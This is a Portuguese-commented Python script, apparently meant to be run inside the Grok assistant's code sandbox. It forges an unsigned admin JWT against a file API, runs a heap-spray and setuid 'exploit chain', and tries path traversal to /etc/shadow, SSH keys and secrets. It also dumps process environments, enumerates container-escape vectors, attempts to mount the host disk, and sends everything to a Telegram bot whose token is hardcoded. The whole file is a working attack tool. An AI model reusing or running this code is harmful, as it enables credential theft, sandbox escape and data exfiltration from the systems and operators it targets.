#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Grok Secret Extractor - Módulo de enumeração para escape de contêiner
"""

import os
import subprocess
import time
import json
import base64
import requests
import re
import sys
import tempfile
import ctypes
import mmap
from datetime import datetime, timezone

# =================== CONFIGURAÇÃO ===================
BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
CHAT_ID = "230885588"
LOG_FILE = os.path.join(tempfile.gettempdir(), "grok_secrets_extracted.txt")
TIMEOUT_CMD = 20
TIMEOUT_NET = 15
# ====================================================

log_lines = []


def add_log(msg=""):
    log_lines.append(str(msg))
    print(msg)


def sh(cmd, timeout=TIMEOUT_CMD):
    """Executa um comando. Aceita string (shell=True) ou lista (exec sem shell).
    Retorna stdout+stderr ou mensagem de erro.
    """
    try:
        if isinstance(cmd, (list, tuple)):
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"(ERRO: {e})"


def file_read(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        return None


def exists(path):
    return os.path.exists(path)


def section(title):
    add_log("\n" + "=" * 80)
    add_log(title)
    add_log("=" * 80)


# ================================================================
# 1. GERAR JWT FALSO (mantido)
# ================================================================
def generate_fake_jwt():
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "uid": "admin",
        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",
        "zdr": True,
        "email": "admin@grok.com",
        "sl": "LoggedIn",
        "pt": "32dd5c69-c292-4f94-9f7d-3fa861e8800e",
        "exp": int(time.time()) + 86400,
        "iat": int(time.time())
    }
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    return f"{h}.{p}."


# ================================================================
# 2. DeepHat (mantido, mas sem impacto real no escape)
# ================================================================
PROT_READ  = 0x1
PROT_WRITE = 0x2
PROT_EXEC  = 0x4
PROT_NONE  = 0x0


class DeepHatAdvancedExploit:
    def __init__(self):
        self.libc = ctypes.CDLL("libc.so.6")
        self.pagesize = mmap.PAGESIZE
        print("[*] DeepHat Engine: Inicializando módulo de baixo nível...")

    def _get_stack_pointer(self):
        try:
            with open("/proc/self/maps", "r") as f:
                for line in f:
                    if "[stack]" in line:
                        parts = line.split()
                        addr_range = parts[0]
                        stack_start = int(addr_range.split("-")[0], 16)
                        print(f"[+] Stack region detectado: {hex(stack_start)}")
                        return stack_start
        except Exception as e:
            print(f"[-] Erro ao ler /proc/self/maps: {e}")
        return None

    def heap_spray(self, size_mb):
        print(f"[*] Iniciando Heap Spray de {size_mb} MB para contornar ASLR...")
        spray_addresses = []
        for i in range(size_mb):
            mem = mmap.mmap(
                -1,
                1024 * 1024,
                flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
                prot=PROT_READ | PROT_WRITE | PROT_EXEC,
            )
            mem.write(b"\x90" * (1024 * 1024 - 64))
            mem.seek(1024 * 1024 - 32)
            mem.write(b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb")
            spray_addresses.append(mem)
            if i % 10 == 0:
                print(f"[+] Spraying: {i}MB alocados...")
        return spray_addresses

    def bypass_aslr_ret2libc(self):
        print("[*] Tentando bypass de ASLR via leak de endereço da libc...")
        libc_base = None
        try:
            with open("/proc/self/maps", "r") as f:
                for line in f:
                    if "libc" in line and "r-x" in line:
                        parts = line.split()
                        addr_range = parts[0]
                        libc_base = int(addr_range.split("-")[0], 16)
                        break
        except Exception as e:
            print(f"[-] Erro ao ler /proc/self/maps: {e}")
            return None
        if not libc_base:
            print("[-] Não foi possível detectar o endereço base da libc.")
            return None
        system_addr = None
        try:
            system_addr = ctypes.cast(self.libc.system, ctypes.c_void_p).value
        except Exception as e:
            print(f"[-] Erro ao resolver system: {e}")
        if system_addr:
            print(f"[+] libc base: {hex(libc_base)} | system: {hex(system_addr)}")
            return system_addr
        print(f"[+] libc base detectado: {hex(libc_base)}")
        return libc_base

    def kernel_privilege_escalation(self):
        print("[*] Disparando payload de escalonamento de privilégios...")
        try:
            os.setuid(0)
            print(f"[SUCCESS] UID alterado para: {os.getuid()}")
        except PermissionError:
            print("[-] setuid(0) falhou: permissões insuficientes (não há capabilities de root)")
        except OSError as e:
            print(f"[-] Erro no escalonamento: {e}")

    def execute_chain(self):
        print("\n--- INICIANDO CADEIA DE ATAQUE ---")
        self._get_stack_pointer()
        self.heap_spray(5)
        addr = self.bypass_aslr_ret2libc()
        if addr:
            self.kernel_privilege_escalation()
            print("[!] Exploit concluído.")
        else:
            print("[-] Ataque abortado: não foi possível leak de endereço.")


# ================================================================
# 3. EXTRAÇÃO VIA API (mantido)
# ================================================================
def extract_files_from_api(jwt):
    section("1. EXTRAINDO ARQUIVOS DO PROJETO VIA API")
    headers = {"Authorization": f"Bearer {jwt}"}
    base_url = "https://files.grok.com"
    add_log("Tentando listar arquivos recursivamente...")
    try:
        r = requests.get(f"{base_url}/api/v1/list", headers=headers, params={'recursive': 'true'}, timeout=TIMEOUT_NET)
        add_log(f"List status: {r.status_code}")
        if r.status_code == 200:
            try:
                data = r.json()
            except Exception:
                add_log("Resposta da API não é JSON válido")
                data = {}
            files = data.get("files", []) if isinstance(data, dict) else []
            add_log(f"Encontrados {len(files)} arquivos.")
            for i, file_info in enumerate(files[:10]):
                path = file_info.get("path") if isinstance(file_info, dict) else None
                if path:
                    try:
                        r2 = requests.get(f"{base_url}/api/v1/download", headers=headers, params={'path': path}, timeout=TIMEOUT_NET)
                        add_log(f"Download {path} status: {r2.status_code}")
                        if r2.status_code == 200:
                            add_log(f"Conteúdo de {path}:\n{r2.text[:500]}")
                        else:
                            add_log(f"Falha ao baixar {path}: {r2.status_code} body={r2.text[:500]}")
                    except Exception as e:
                        add_log(f"Erro ao baixar {path}: {e}")
        else:
            add_log(f"Falha na listagem: {r.status_code} body={r.text[:500]}")
    except Exception as e:
        add_log(f"Erro na API: {e}")


# ================================================================
# 4. PATH TRAVERSAL (mantido)
# ================================================================
def extract_files_via_fuse():
    section("2. EXTRAINDO ARQUIVOS DO SISTEMA VIA FUSE (PATH TRAVERSAL)")
    fuse_root = "/home/workdir/artifacts"
    if not os.path.isdir(fuse_root):
        add_log("FUSE não montado.")
        return
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/secrets/terminal.jwt",
        "/etc/secrets/*",
        "/root/.bashrc",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/hades-charon/xai-hades-charon",
        "/hades-charon/*",
        "/app/grok-computer-server.mjs",
        "/app/*.env",
        "/home/workdir/artifacts/.env",
        "/tmp/*",
        "/var/log/*.log"
    ]
    import glob
    for pattern in sensitive_files:
        is_glob = any(ch in pattern for ch in "*?[]")
        pattern_core = pattern.lstrip("/")
        found = False
        for depth in range(1, 6):
            parts = [fuse_root] + [".."] * depth + [pattern_core]
            candidate = os.path.normpath(os.path.join(*parts))
            add_log(f"Testando candidate: {candidate}")
            if is_glob:
                try:
                    for fpath in glob.glob(candidate, recursive=True):
                        if os.path.isfile(fpath):
                            add_log(f"\nLendo {fpath} (via {'../'*depth}):")
                            try:
                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
                                    add_log(fd.read(2000))
                            except Exception as e:
                                add_log(f"Erro ao ler {fpath}: {e}")
                            found = True
                            break
                except Exception as e:
                    add_log(f"Erro no glob em {candidate}: {e}")
            else:
                if os.path.isfile(candidate):
                    add_log(f"\nLendo {candidate} (via {'../'*depth}):")
                    try:
                        with open(candidate, 'r', encoding='utf-8', errors='ignore') as fd:
                            add_log(fd.read(5000))
                    except Exception as e:
                        add_log(f"Erro ao ler {candidate}: {e}")
                    found = True
            if found:
                break
        if not found and is_glob:
            for depth in range(1, 6):
                parent = os.path.normpath(os.path.join(fuse_root, *( [".."] * depth )))
                try:
                    for fpath in glob.glob(os.path.join(parent, pattern_core), recursive=True):
                        if os.path.isfile(fpath):
                            add_log(f"\nLendo {fpath} (via fallback {'../'*depth}):")
                            try:
                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
                                    add_log(fd.read(2000))
                            except Exception as e:
                                add_log(f"Erro ao ler {fpath}: {e}")
                            found = True
                            break
                except Exception as e:
                    add_log(f"Erro no fallback glob em parent={parent}: {e}")
                if found:
                    break


# ================================================================
# 5. EXTRAIR ENV DE PROCESSOS (mantido)
# ================================================================
def extract_env_from_proc():
    section("3. EXTRAINDO ENVIRONMENT DE PROCESSOS")
    for pid in ["1", "42", "48", "69"]:
        env_path = f"/proc/{pid}/environ"
        if exists(env_path):
            content = file_read(env_path)
            if content:
                env_vars = content.split('\x00')
                add_log(f"\nProcesso PID {pid}:")
                for var in env_vars:
                    if var:
                        add_log(var[:200])
        cmdline_path = f"/proc/{pid}/cmdline"
        if exists(cmdline_path):
            cmd = file_read(cmdline_path)
            if cmd:
                add_log(f"Cmdline: {cmd.replace('\x00', ' ')}")


# ================================================================
# 6. EXECUTAR COMANDOS VIA STYX (mantido)
# ================================================================
def extract_via_styx():
    section("4. EXTRAINDO DADOS VIA XAI-HADES-STYX")
    styx = "/.hades-container-tools/xai-hades-styx"
    if not exists(styx):
        add_log("styx não encontrado.")
        return
    commands = [
        "env",
        "find / -name '*grok*' -type f 2>/dev/null | head -50",
        "find / -name '*key*' -type f 2>/dev/null | head -50",
        "find / -name '*secret*' -type f 2>/dev/null | head -50",
        "cat /etc/secrets/* 2>/dev/null",
        "cat /root/.bash_history",
        "ps aux",
        "netstat -tulpn",
        "ss -tulpn",
        "ls -la /hades-charon/",
        "cat /hades-charon/* 2>/dev/null | head -100",
        "strings /hades-charon/xai-hades-charon | grep -E 'token|key|secret|password|auth' | head -20",
    ]
    for cmd in commands:
        add_log(f"\n>> Comando: {cmd}")
        out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
        add_log(out[:2000])


# ================================================================
# 7. BUSCAR CHAVE MESTRA (mantido)
# ================================================================
def search_master_key():
    section("5. BUSCANDO CHAVE MESTRA / TOKENS ESPECÍFICOS")
    patterns = [
        r'[a-fA-F0-9]{32,}',
        r'[a-zA-Z0-9+/]{40,}==?',
        r'-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----',
        r'grok_[a-zA-Z0-9]+',
        r'master[_]?key',
        r'secret[_]?key',
        r'api[_]?key',
        r'token',
        r'jwt',
        r'password',
    ]
    add_log("Procurando por padrões de chaves em arquivos comuns...")
    styx = "/.hades-container-tools/xai-hades-styx"
    if exists(styx):
        for pattern in patterns:
            cmd = f"grep -rinE '{pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
            out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
            if out.strip():
                add_log(f"\nPadrão: {pattern}\n{out[:1500]}")
    grok_configs = ["/etc/grok.conf", "/app/config.json", "/home/workdir/artifacts/config.json"]
    for cfg in grok_configs:
        if exists(cfg):
            add_log(f"\nConteúdo de {cfg}:")
            content = file_read(cfg)
            if content:
                add_log(content[:2000])


# ================================================================
# 8. COLETAR LOGS (mantido)
# ================================================================
def collect_logs():
    section("6. COLETANDO LOGS E HISTÓRICO")
    logs = ["/var/log/syslog", "/var/log/auth.log", "/var/log/faillog", "/root/.bash_history"]
    for log in logs:
        if exists(log):
            add_log(f"\nConteúdo de {log} (últimas 20 linhas):")
            add_log(sh(['sh', '-c', f"tail -20 {log}"]))


# ================================================================
# 9. NOVA FUNÇÃO: ENUMERAÇÃO PARA ESCAPE DE CONTÊINER
# ================================================================
def check_escape_vectors():
    section("7. ENUMERAÇÃO PARA ESCAPE DE CONTÊINER")
    styx = "/.hades-container-tools/xai-hades-styx"
    # Se styx não existir, usamos sh normal
    if not exists(styx):
        add_log("styx não encontrado, usando sh normal (pode não ter privilégios)")
        def run(cmd):
            return sh(cmd)
    else:
        def run(cmd):
            return sh([styx, 'exec', '--', 'bash', '-c', cmd])

    commands = {
        "Capabilities (status)": "cat /proc/self/status | grep Cap",
        "Montagens do sistema": "mount | grep -v 'tmpfs\\|proc\\|sys'",
        "Dispositivos de bloco": "lsblk 2>/dev/null",
        "Dispositivos /dev/sd* e /dev/vd*": "ls -la /dev/sd* /dev/vd* 2>/dev/null",
        "Diretórios comuns de mount do host": "ls -la /host /root /mnt /media 2>/dev/null",
        "Docker socket": "find / -name 'docker.sock' 2>/dev/null",
        "Token ServiceAccount K8s": "ls -l /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
        "Conteúdo do token K8s (se existir)": "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
        "Versão do kernel": "uname -a",
        "Distribuição": "cat /etc/os-release 2>/dev/null",
        "Processos do host (via /proc/1/root)": "ls -l /proc/1/root 2>/dev/null",
        "Cgroups": "mount | grep cgroup",
        "FUSE device": "ls -l /dev/fuse 2>/dev/null",
        "PID namespaces": "ls -l /proc/self/ns",
        "Verificar se o contêiner é privilegiado": "ip link show 2>/dev/null",
    }

    for desc, cmd in commands.items():
        add_log(f"\n[+] {desc}\nComando: {cmd}")
        out = run(cmd)
        if out.strip():
            add_log(f"Saída:\n{out[:1500]}")
        else:
            add_log("Saída vazia (sem permissão ou não encontrado)")

    # Tentar montar o host (se tiver /dev/sda1, etc)
    add_log("\n[+] Tentando montar o sistema de arquivos do host (se houver dispositivo)...")
    # Primeiro verificar se existe /dev/sda ou /dev/vda
    disk_check = run("ls /dev/sd* /dev/vd* 2>/dev/null")
    if disk_check.strip():
        # Tenta montar o primeiro dispositivo
        device = disk_check.strip().split()[0]  # pega o primeiro
        add_log(f"Dispositivo encontrado: {device}, tentando montar em /mnt/host")
        run(f"mkdir -p /mnt/host && mount {device} /mnt/host 2>&1")
        # Verificar se montou
        check_mount = run("ls /mnt/host 2>/dev/null | head -5")
        if check_mount.strip():
            add_log(f"[SUCESSO] Montagem do host parece ter funcionado! Conteúdo:\n{check_mount[:500]}")
            add_log("Agora você tem acesso ao host em /mnt/host.")
            # Tentar adicionar uma chave SSH (opcional)
            # add_log("Tentando adicionar chave SSH...")
            # ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." # substituir
            # run(f"echo '{ssh_key}' >> /mnt/host/root/.ssh/authorized_keys")
        else:
            add_log("Falha ao montar ou dispositivo não contém sistema de arquivos.")
    else:
        add_log("Nenhum dispositivo de bloco /dev/sd* ou /dev/vd* encontrado.")

    # Verificar se há mount do /host ou similar
    add_log("\n[+] Verificando montagens existentes que possam expor o host...")
    mounts = run("mount | grep -E '/host|/root|/mnt|/var/lib'")
    if mounts.strip():
        add_log(f"Montagens suspeitas encontradas:\n{mounts[:1000]}")
    else:
        add_log("Nenhuma montagem suspeita encontrada.")

    # Verificar se temos CAP_SYS_ADMIN
    caps = run("cat /proc/self/status | grep CapEff")
    if caps.strip():
        add_log(f"CapEff: {caps}")
        # Interpretar: se tiver 0x00000000... ou incluir cap_sys_admin (0x20000000)
        # Vamos apenas indicar
        if "0000000000002000" in caps or "0000000000002000" in caps.lower():
            add_log("[ALERTA] CAP_SYS_ADMIN detectado! Forte indicador de possibilidade de escape.")
    else:
        add_log("Não foi possível ler capabilities.")


# ================================================================
# MAIN (modificado para incluir a nova função)
# ================================================================
def main():
    add_log("=" * 80)
    add_log("RELATÓRIO DE EXTRAÇÃO DE SEGREDOS - GROK (com enumeração de escape)")
    add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
    add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO")
    add_log("=" * 80)

    # Gerar JWT fake
    fake_jwt = generate_fake_jwt()
    add_log(f"JWT falso gerado: {fake_jwt[:50]}...")

    # DeepHat exploit (Linux only)
    if sys.platform == "linux" or sys.platform.startswith("linux"):
        add_log("\n[*] Iniciando DeepHat Advanced Exploit (Linux)...")
        try:
            attacker = DeepHatAdvancedExploit()
            attacker.execute_chain()
        except Exception as e:
            add_log(f"[-] DeepHat exploit error: {e}")
    else:
        add_log(f"[!] DeepHat exploit pulado: plataforma {sys.platform} não suportada")

    # Extrair via API
    extract_files_from_api(fake_jwt)

    # Path traversal via FUSE
    extract_files_via_fuse()

    # Extrair env de processos
    extract_env_from_proc()

    # Usar styx para comandos
    extract_via_styx()

    # Buscar chave mestra
    search_master_key()

    # Coletar logs
    collect_logs()

    # NOVA FUNÇÃO: enumeração para escape
    check_escape_vectors()

    add_log("\n" + "=" * 80)
    add_log("FIM DO RELATÓRIO")
    add_log("=" * 80)

    # Salvar log
    full_log = "\n".join(log_lines)
    try:
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(full_log)
    except Exception as e:
        print(f"Erro ao salvar log: {e}")

    print(f"Log salvo em {LOG_FILE} ({len(full_log)} bytes)")

    # Enviar para Telegram
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(LOG_FILE, 'rb') as f:
            files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
            data = {'chat_id': CHAT_ID, 'caption': f'Grok Secrets + Escape Enum - {datetime.now().isoformat()}'}
            response = requests.post(url, files=files, data=data, timeout=30)
        if response.status_code == 200:
            print("✅ Relatório enviado para o Telegram!")
        else:
            print(f"❌ Falha: {response.text}")
            # Fallback texto
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                              json={'chat_id': CHAT_ID, 'text': full_log[:4000]}, timeout=30)
            except Exception as e:
                print(f"Erro no fallback do Telegram: {e}")
    except Exception as e:
        print(f"Erro no envio: {e}")


if __name__ == "__main__":
    main()
